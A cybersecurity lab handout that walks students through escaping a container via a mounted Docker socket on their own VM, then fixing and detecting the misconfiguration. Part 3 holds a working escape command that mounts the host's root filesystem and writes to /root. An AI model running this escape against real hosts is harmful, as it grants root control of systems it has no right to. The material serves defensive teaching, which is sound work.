# Lab 03 (Option B) - Escape via the Docker Socket

**Cybersecurity Lab Room S617 - Virtualization & Containerization**

> **This is an alternative to the PHP web-shell escape lab** (`03-container-
> escape-and-mitigation.md`). Pick **one** to run. This version is a little
> simpler to set up (no web app) and demonstrates the single most common
> real-world container misconfiguration: **a container given the Docker socket.**
>
> **Goal:** perform a container escape by abusing the Docker socket to take over
> the host, then fix it and prove the fix works.

---

## ⚠️ Rules of engagement - read this first

- You will attack a **deliberately misconfigured container** - **only on your own
  S617 workshop VM**. The "host" you take over is **your own disposable VM**.
- Doing this to a system you don't own is a **crime**. The skill here is
  **defense**: attack a target you control to learn to protect real ones.
- Broke something? `vagrant destroy -f && vagrant up` resets the VM.

---

## The scenario

A team ran a helper container (think: a monitoring agent or CI runner) and gave
it access to the **Docker socket** - `/var/run/docker.sock` - "so it could manage
other containers." This is one of the most common setups in the wild. The
problem: the Docker socket is the **remote control for the host's Docker
daemon**, and that daemon runs as **root**. Control the socket, control the host.

Files are in **`docker-demo/escape-socket/`**:
- `docker-compose.yml` - the misconfigured (vulnerable) stack
- `docker-compose.hardened.yml` - the fixed stack

---

## Part 1 - Deploy the misconfigured container

```bash
cd docker-demo/escape-socket
cat docker-compose.yml        # read it - spot the socket mount
docker compose up -d
```

The one red flag: `- /var/run/docker.sock:/var/run/docker.sock`. That line hands
the container the keys to the host's Docker daemon.

> 📸 **Screenshot:** _the compose file with the socket-mount line visible._

---

## Part 2 - Confirm you control the host's Docker daemon

Get a shell inside the agent container and talk to the daemon:

```bash
docker compose exec agent sh
# now INSIDE the container:
docker ps          # you can see the HOST's containers - you're driving the
                   # host daemon from inside a container
```

Seeing the host's containers listed is the "uh-oh" moment: a process inside a
container is commanding the host's Docker.

> 📸 **Screenshot:** _`docker ps` run inside the agent container, listing host
> containers._

---

## Part 3 - Escape to the host

You control the daemon, so **tell it to start a new container that mounts the
host's filesystem** - then write to the host through it. Still inside the agent
container:

```bash
# Launch a throwaway container, mount the host's / at /host, and use it:
docker run --rm -v /:/host alpine sh -c \
  'echo PWNED-BY-S617 > /host/root/ESCAPED-SOCKET.txt; cat /host/etc/hostname'
exit    # leave the agent container
```

That new `alpine` container ran on the **host's** daemon with the **host's root
filesystem** mounted - so it wrote a file into the host's `/root`. **Prove it
from the host side** (XFCE Terminal or `vagrant ssh`):

```bash
sudo cat /root/ESCAPED-SOCKET.txt
```

There it is - a file written to the host's `/root`, created by a container that
only had one extra thing: the Docker socket. That's the escape.

> 📸 **Screenshot:** _`sudo cat /root/ESCAPED-SOCKET.txt` on the host - proof._

**Why it worked (one sentence):** the Docker socket is root-level control of the
host's daemon, so a container that can reach it can launch another container that
mounts and owns the host.

Tear it down and clean up:

```bash
cd ~/<path>/docker-demo/escape-socket     # wherever the files are
docker compose down
sudo rm -f /root/ESCAPED-SOCKET.txt
```

---

## Part 4 - Mitigate: take away the socket

Read the hardened file:

```bash
cat docker-compose.hardened.yml
```

The fix is simply **removing the socket mount** - now there's no daemon to
command. Bring it up and confirm the escape path is gone:

```bash
docker compose -f docker-compose.hardened.yml up -d
docker compose -f docker-compose.hardened.yml exec agent sh
# inside the container now:
docker ps          # FAILS: "Cannot connect to the Docker daemon" - no socket
exit
```

The container can no longer see or control the host's Docker. Escape path
closed.

> 📸 **Screenshot:** _`docker ps` inside the hardened container failing to
> connect._

**If a container genuinely needs the Docker API** (some CI/monitoring tools do),
never give it the raw socket. Put a **socket proxy** in front (for example
`tecnativa/docker-socket-proxy`) that exposes only the specific, ideally
read-only, endpoints it needs. Better still, use **rootless Docker**.

Tear it down:

```bash
docker compose -f docker-compose.hardened.yml down
```

---

## Part 5 - The defender's view: catch it in review

The giveaway is a container whose mounts include the Docker socket. That's what a
reviewer or scanner looks for:

```bash
docker compose up -d
docker inspect escape-socket-agent-1 \
  --format 'Mounts={{range .Mounts}}{{.Source}}->{{.Destination}} {{end}}'
docker compose down
```

(Container name may differ - `docker ps` shows it.) A **Source of
`/var/run/docker.sock`** on an untrusted container is a finding, every time.

**Your hardening checklist** (resume-ready knowledge):
- **Never** mount `/var/run/docker.sock` into a container you don't fully trust.
- If Docker API access is truly required, use a **restricted socket proxy**, not
  the raw socket.
- Prefer **rootless Docker**, so the daemon isn't root to begin with.
- Remember: membership in the **`docker` group** on the host is the same power -
  it's root-equivalent.
- Monitor/scan images and compose files in CI for socket mounts and
  `--privileged`.

---

## Cleanup

```bash
docker compose down 2>/dev/null
docker compose -f docker-compose.hardened.yml down 2>/dev/null
sudo rm -f /root/ESCAPED-SOCKET.txt
```

Or `vagrant destroy -f && vagrant up` for a guaranteed clean slate.

---

## Show it off - add this to your portfolio & resume

**Portfolio deliverable** (commit under `submissions/<your-username>/lab03/`):
1. `docker ps` run from *inside* the agent container, listing host containers.
2. `sudo cat /root/ESCAPED-SOCKET.txt` on the host - proof of the escape.
3. The hardened container failing to reach the daemon.
4. **In your own words:** why does access to the Docker socket equal root on the
   host, and what's the right way to give a tool limited Docker access?

**Resume / interview framing:**
- "Demonstrated and remediated a Docker-socket container escape; recommended
  socket-proxy and rootless-Docker controls to remove host-root exposure."
- Be ready to explain: the socket is the daemon's control channel, the daemon is
  root, so the socket is root.

> **Why this matters:** the mounted Docker socket is one of the most common real
> findings in container security reviews. Being able to say "I've exploited it
> and I know how to fix it" is a genuine edge.

---

### One-line summary to remember

> The **Docker socket is root on the host**. Any container that can reach
> `/var/run/docker.sock` can launch another container that owns the machine.
> Don't mount it - and if a tool truly needs the Docker API, put a restricted
> proxy in front, never the raw socket.
